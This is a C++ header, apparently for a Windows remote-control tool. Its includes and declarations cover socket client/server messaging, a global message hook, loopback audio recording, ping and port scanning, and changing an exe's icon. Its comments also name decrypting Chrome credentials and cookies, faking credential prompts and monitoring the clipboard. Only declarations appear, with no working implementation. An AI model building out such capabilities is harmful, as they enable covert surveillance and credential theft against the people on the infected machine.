#pragma once
#include <string>
#include <iostream>
#include <fstream>
#include<stdio.h>
#include <tchar.h>
//容器
#include <vector>
#include <queue>
#include <map>
#include <set>
//socket
#include <Winsock2.h>
#include <Ws2tcpip.h>
#pragma comment(lib,"Ws2_32.lib")
//opencv
#include <opencv.hpp>
//win32api
#include <windows.h>
//正则
#include <regex>
//文件操作所需
#include <oleidl.h>
#include <io.h>
//Cstring
#include <atlstr.h>
//更改图标所需
#include <shobjidl_core.h>
//播放音频
#pragma comment(lib,"winmm.lib")
//设置音量
#include <mmdeviceapi.h>
#include <endpointvolume.h>
#pragma comment(lib,"Winmm.lib")
//环回录音
#include <Audioclient.h>
//#include <mmdeviceapi.h>
//弹出凭据验证窗口
#include <wincred.h>
#pragma comment(lib, "Credui.lib")
//解密chrome凭据/cookie
#include <Wincrypt.h>
#pragma comment(lib, "crypt32.lib")
//sqlite3
#include "sqlite3/sqlite3.h"
#pragma comment(lib, "sqlite3/sqlite3.lib")
//锁
#include <mutex>
//多线程
#include <thread>
//主机/端口扫描，ping，别改动这里的顺序，会炸
#include <iphlpapi.h> 
#include <icmpapi.h>
#pragma comment(lib,"Iphlpapi.lib")
//监控垃圾桶
#include <shlobj.h> 
//转换SID为string
#include <sddl.h>
#pragma comment(lib, "ws2_32.lib")
//监控剪贴板
#include <comdef.h>
//设置显示器亮度
#include <Highlevelmonitorconfigurationapi.h>
#include <physicalmonitorenumerationapi.h>
#pragma comment(lib, "Dxva2.lib")
//用户操作
#include <Lm.h>
#pragma comment(lib, "Netapi32.lib")
//睡眠/休眠
#include <powrprof.h>
#pragma comment( lib, "powrprof.lib" )
//设置壁纸
#include <winuser.h>
//#pragma comment(lib, "user32.lib") 
//锁屏
#pragma comment( lib, "user32.lib" )
//录音
#pragma comment(lib, "winmm.lib")

#include "config.hpp"

using namespace std;
using namespace cv;
void server(Config& c);
void client(Config& c);
int send_message(SOCKET* sock, string message);
string recv_message(SOCKET* sock, char* text_buf, int size);
int send_rottext(SOCKET* sock, string message);
string recv_rottext(SOCKET* sock, char* text_buf, int size);
DWORD WINAPI ICMPthread(void* args);
DWORD WINAPI PORTthread(void* args);
LRESULT CALLBACK Hook_ALLMessage(int nCode, WPARAM wParam, LPARAM lParam);

class Args {
public:
	Args(int args_count, char* args_text[], Config& c);
	void localarg(Config& c, string argfile);
	void match(Config& c, int args_count, char* args_text[]);
	void all_help();
};

//exe修改图标
struct TIconHeader
{
    WORD idReserved;
    WORD idType;
    WORD idCount; //目录数
};

#pragma pack(1)
struct TResDirHeader
{
    BYTE bWidth; // 图像宽度，以象素为单位。一个字节
    BYTE bHeight; // 图像高度，以象素为单位。一个字节
    BYTE bColorCount; // 图像中的颜色数（如果是>=8bpp的位图则为0）
    BYTE bReserved; //保留字必须是0
    WORD wPlanes; // 标设备说明位面数，其值将总是被设为1
    WORD wBitCount; // 每象素所占位数
    DWORD lBYTEsInRes; // 每份资源所占字节数
    DWORD lImageOffset; // 图像数据（iconimage）起点偏移位置
};
#pragma pack()

typedef struct TIconResDirGrp
{
    TIconHeader idHeader;
    TResDirHeader idEntries[1];

} *PIconResDirGrp;



//环回录音，写入wav
class WavWriter {
public:
	WavWriter(WAVEFORMATEX* fm, string filename);
	~WavWriter();
	void init();
	void write(BYTE* data, int length);
	void close();

private:
	unsigned int chunkSize; // 36 + SubChunk2Size
	unsigned int subchunk1Size;
	unsigned char* fmt;
	unsigned short blockAlign;
	unsigned int subchunk2Size; //NumSamples * NumChannels * BitsPerSample/8

	ofstream file;
	string filename;
};

//环回录音主体
class AudioCapture {
public:
	AudioCapture(string filename = "sfbd_lb_record.wav", int time = 60);
	~AudioCapture();

	string init();
	string Recording();
private:
	HRESULT hr;
	//每10000000秒重新计时
	REFERENCE_TIME hnsRequestedDuration = 10000000;
	REFERENCE_TIME hnsActualDuration;
	UINT32 bufferFrameCount;
	UINT32 numFramesAvailable;
	IMMDeviceEnumerator* pEnumerator = NULL;
	IMMDevice* pDevice = NULL;
	IAudioClient* pAudioClient = NULL;
	IAudioCaptureClient* pCaptureClient = NULL;
	WAVEFORMATEX* pwfx = NULL;
	UINT32 packetLength = 0;
	BYTE* pData;
	DWORD flags;
	WavWriter* wav_file;
	int cap_time;
	string filename;

	//__uuidof,获取某种结构、接口及其指针、引用、变量所关联的GUID
	const IID IID_IAudioCaptureClient = __uuidof(IAudioCaptureClient);
	const CLSID CLSID_MMDeviceEnumerator = __uuidof(MMDeviceEnumerator);
	const IID IID_IMMDeviceEnumerator = __uuidof(IMMDeviceEnumerator);
	const IID IID_IAudioClient = __uuidof(IAudioClient);
};



struct ThreadArgs {
	queue<string> IPlist;
	bool stop;
	mutex mtx;
	double TimeOut;
	int StartPort;
	int EndPort;
	string result;
};

